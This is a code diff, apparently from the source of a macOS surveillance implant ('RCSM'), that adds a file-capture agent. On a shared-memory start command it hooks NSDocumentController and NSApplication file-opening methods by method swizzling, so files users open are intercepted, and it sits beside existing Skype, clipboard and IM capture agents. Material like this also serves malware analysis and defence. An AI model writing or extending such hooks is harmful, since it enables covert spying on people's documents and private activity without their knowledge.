@@ -27,7 +27,7 @@
 #import "RCSMInputManager.h"
 #import "RCSMAgentVoipSkype.h"
 #import "RCSMAgentApplication.h"
-
+#import "RCSMAgentFileCapture.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
@@ -64,6 +64,7 @@ static int imFlag           = 0;
 static int clipboardFlag    = 0;
 static int voipFlag         = 0;
 static int appFlag          = 0;
+static int fileFlag         = 0;
 
 NSDictionary *getActiveWindowInformationForPID(pid_t pid)
 {
@@ -830,6 +831,18 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           
           //[readData release];
         }
+
+      readData = [mSharedMemoryCommand readMemory: OFFT_FILECAPTURE
+                                    fromComponent: COMP_AGENT];
+      if (readData != nil)
+        {
+          shMemCommand = (shMemoryCommand *)[readData bytes];
+          
+          if (fileFlag == 0 && shMemCommand->command == AG_START)
+            fileFlag = 1;
+          else if (fileFlag == 1 || fileFlag == 2 && shMemCommand->command == AG_STOP)
+            fileFlag = 3;
+        }
       
       //
       // Perform swizzle here
@@ -1331,8 +1344,63 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             }
         }
       
+      if (fileFlag == 1)
+        {
+          fileFlag = 2;
+#ifdef DEBUG_INPUT_MANAGER
+          infoLog(@"Hooking for file capture");
+#endif
+
+          Class className   = objc_getClass("NSDocumentController");
+          Class classSource = objc_getClass("myNSDocumentController");
+
+          swizzleByAddingIMP(className,
+                             @selector(openDocumentWithContentsOfURL:display:error:),
+                             class_getMethodImplementation(classSource,
+                                                @selector(openDocumentWithContentsOfURLHook:display:error:)),
+                             @selector(openDocumentWithContentsOfURLHook:display:error:));
+
+          className   = objc_getClass("NSApplication");
+          classSource = objc_getClass("myNSApplication");
+          swizzleByAddingIMP(className,
+                             @selector(openFile:ok:),
+                             class_getMethodImplementation(classSource,
+                                                           @selector(openFileHook:ok:)),
+                             @selector(openFileHook:ok:));
+          swizzleByAddingIMP(className,
+                             @selector(_openFileWithoutUI:),
+                             class_getMethodImplementation(classSource,
+                                                           @selector(_openFileWithoutUIHook:)),
+                             @selector(_openFileWithoutUIHook:));
+          swizzleByAddingIMP(className,
+                             @selector(_doOpenFile:ok:tryTemp:),
+                             class_getMethodImplementation(classSource,
+                                                           @selector(_doOpenFileHook:ok:tryTemp:)),
+                             @selector(_doOpenFileHook:ok:tryTemp:));
+
+          FCStartAgent();
+        }
+      else if (fileFlag == 3)
+        {
+          fileFlag = 0;
+
+          //FCStopAgent();
+          
+          Class className   = objc_getClass("NSDocumentController");
+          Class classSource = objc_getClass("myNSDocumentController");
+
+          swizzleByAddingIMP(className,
+                             @selector(openDocumentWithContentsOfURL:display:error:),
+                             class_getMethodImplementation(classSource,
+                             @selector(openDocumentWithContentsOfURLHook:display:error:)),
+                             @selector(openDocumentWithContentsOfURLHook:display:error:));
+
+#ifdef DEBUG_INPUT_MANAGER
+          infoLog(@"Unhooking for file capture");
+#endif
+        }
+
       usleep(8000);
-      
       [innerPool release];
     }
   /*
